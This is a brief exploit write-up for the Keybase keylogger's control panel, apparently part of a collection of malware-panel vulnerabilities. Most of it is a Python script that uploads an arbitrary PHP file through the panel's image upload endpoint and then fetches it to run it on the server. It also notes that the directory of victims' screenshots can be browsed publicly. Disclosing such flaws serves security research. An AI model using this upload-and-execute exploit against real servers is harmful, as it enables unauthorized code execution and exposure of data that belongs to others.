#### Keybase


Type: Upload vulnerability

Author: [Unit32](https://twitter.com/Xylit0l)


```
import requests
import sys

if len(sys.argv) != 2:
	print "Usage: %s [php_file]" % __file__
	sys.exit(1)

URL = ""
print "Sending request..."

multiple_files = [('file', ('WIN-JJFOIJGL_6_5_14_22_2.php', open(sys.argv[1], 'rb')))]

r = requests.post(URL + "image/upload.php", files=multiple_files)
print "Results:"
print

r = requests.get(URL + "image/Images/WIN-JJFOIJGL_6_5_14_22_2.php")
print r.text
```


Type: Permissions

```
Anyone can browe /image/Images (screenshots of victims computers)
```
